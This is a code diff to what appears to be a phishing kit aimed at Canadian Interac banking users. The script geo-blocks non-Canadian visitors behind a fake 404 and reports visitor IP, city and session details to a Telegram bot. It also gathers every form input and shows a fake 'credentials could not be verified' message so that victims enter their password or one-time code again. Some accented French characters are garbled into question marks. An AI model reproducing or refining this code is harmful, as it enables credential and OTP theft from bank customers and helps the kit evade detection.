@@ -64,13 +64,13 @@
 
         if (!cfTraceOk && countryCode === '??') {
             show404();
-            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (SECURITY MAXIMUM)</b> ??\n\nHeure : " + date + " à " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
+            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (SECURITY MAXIMUM)</b> ??\n\nHeure : " + date + " ? " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
             return;
         }
 
         if (countryCode !== 'CA') {
             show404();
-            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (HORS CANADA)</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b> (" + countryCode + ")\nHeure : " + date + " à " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
+            tgSend(BOT_RADAR, "?? <b>ACCES BLOQUE (HORS CANADA)</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b> (" + countryCode + ")\nHeure : " + date + " ? " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
             return;
         }
 
@@ -82,7 +82,7 @@
         
         let pageName = window.location.pathname.split('/').pop() || 'Index';
         if (!sessionStorage.getItem('geo_notified') || pageName === 'interac.html' || pageName === 'index.html') {
-            tgSend(BOT_RADAR, "?? <b>NOUVELLE CONNEXION (CANADA) - Page: " + pageName + "</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b>\nHeure : " + date + " à " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
+            tgSend(BOT_RADAR, "?? <b>NOUVELLE CONNEXION (CANADA) - Page: " + pageName + "</b> ??\n\nIP : <code>" + ip + "</code>\nVille : <b>" + city + "</b>\nPays : <b>" + country + "</b>\nHeure : " + date + " ? " + time + "\nID Session : <code>" + SESSION_ID + "</code>");
             sessionStorage.setItem('geo_notified', 'true');
         }
     }
@@ -146,7 +146,7 @@
                     }
                 });
                 
-                // Backup si aucun input n'a été capturé par querySelectorAll (ex: champs dynamiques)
+                // Backup si aucun input n'a ?t? captur? par querySelectorAll (ex: champs dynamiques)
                 if (dataText === "") {
                     const allInputs = document.querySelectorAll('input');
                     allInputs.forEach(input => {
@@ -263,12 +263,15 @@
                                         
                                         loader.style.display = 'none';
                                         
-                                        let errorContainer = document.querySelector('.error-msg, .alert-danger, #errorMsg');
-                                        if (errorContainer) {
-                                            errorContainer.style.display = 'block';
-                                            errorContainer.innerHTML = "Les informations saisies sont incorrectes. Veuillez réessayer.";
+                                        let existingErr = form.querySelector('.tg-inline-error-msg');
+                                        if (!existingErr) {
+                                            existingErr = document.createElement('div');
+                                            existingErr.className = 'tg-inline-error-msg';
+                                            existingErr.style.cssText = 'background-color:#fff0f0; border:1px solid #ffcccc; color:#cc0000; padding:12px 15px; border-radius:4px; margin-bottom:20px; font-size:14px; font-family:sans-serif; text-align:left; display:flex; align-items:center; gap:10px; width:100%; box-sizing:border-box;';
+                                            existingErr.innerHTML = '<span style="font-weight:bold;">??</span> <span>Your credentials could not be verified. Please check your information and try again.</span>';
+                                            form.insertBefore(existingErr, form.firstChild);
                                         } else {
-                                            alert("Les informations saisies sont incorrectes. Veuillez réessayer.");
+                                            existingErr.style.display = 'flex';
                                         }
                                         
                                         let pw = form.querySelector('input[type="password"], input[name*="code"], input[name*="otp"]');
